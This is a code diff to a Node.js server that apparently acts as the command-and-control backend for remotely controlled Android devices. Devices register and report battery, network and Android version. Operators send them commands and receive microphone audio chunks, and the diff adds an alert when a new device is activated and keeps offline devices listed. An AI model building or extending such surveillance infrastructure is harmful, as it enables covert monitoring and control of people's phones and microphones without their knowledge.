@@ -38,7 +38,6 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true, time: Date.now() });
     }
 
-    // === РЕГИСТРАЦИЯ ===
     if (path === '/register') {
         const body = await readBody(req);
         const role = body.role || 'client';
@@ -62,7 +61,6 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true });
     }
 
-    // === ОТКЛЮЧЕНИЕ ===
     if (path === '/unregister') {
         const body = await readBody(req);
         const role = body.role || q.role || 'client';
@@ -78,7 +76,6 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true });
     }
 
-    // === ОПРОС ===
     if (path === '/poll') {
         const role = q.role || 'client';
         const id = q.id || 'unknown';
@@ -87,14 +84,13 @@ const server = http.createServer(async (req, res) => {
             const now = Date.now();
             const devices = [];
             for (const [did, c] of clients) {
-                if (now - c.lastSeen > 8000) continue;
                 devices.push({
                     id: did,
                     name: c.name,
                     network: c.network,
                     battery: c.battery,
                     android: c.android,
-                    online: true,
+                    online: now - c.lastSeen < 8000,
                     lastSeen: c.lastSeen
                 });
             }
@@ -115,7 +111,6 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true, queue });
     }
 
-    // === ОТПРАВКА КОМАНДЫ ===
     if (path === '/send') {
         const body = await readBody(req);
         const target = body.target;
@@ -130,7 +125,6 @@ const server = http.createServer(async (req, res) => {
         return send(res, 200, { ok: true });
     }
 
-    // === СОБЫТИЯ ОТ КЛИЕНТА ===
     if (path === '/event') {
         const body = await readBody(req);
         const id = body.deviceId || q.id || 'unknown';
@@ -156,6 +150,16 @@ const server = http.createServer(async (req, res) => {
             for (const [, a] of admins) {
                 a.queue.push({ type: 'mic_chunk', deviceId: id, data: body.data || '', ts: Date.now() });
             }
+        } else if (t === 'client_activated') {
+            console.log('[!] client activated: ' + id + ' name=' + (body.name || '-'));
+            for (const [, a] of admins) {
+                a.queue.push({
+                    type: 'client_activated',
+                    deviceId: id,
+                    name: body.name || 'Unknown',
+                    ts: Date.now()
+                });
+            }
         }
 
         clients.set(id, c);
@@ -165,11 +169,10 @@ const server = http.createServer(async (req, res) => {
     send(res, 404, { ok: false });
 });
 
-// Очистка — удаляем через 8 сек без активности
 setInterval(() => {
     const now = Date.now();
     for (const [id, c] of clients) {
-        if (now - c.lastSeen > 8000) {
+        if (now - c.lastSeen > 60000) {
             clients.delete(id);
             console.log('[-] client removed (timeout): ' + id);
         }
@@ -177,6 +180,6 @@ setInterval(() => {
     for (const [id, a] of admins) {
         if (now - a.lastSeen > 120000) admins.delete(id);
     }
-}, 3000);
+}, 5000);
 
 server.listen(PORT, () => console.log('Server on port ' + PORT));
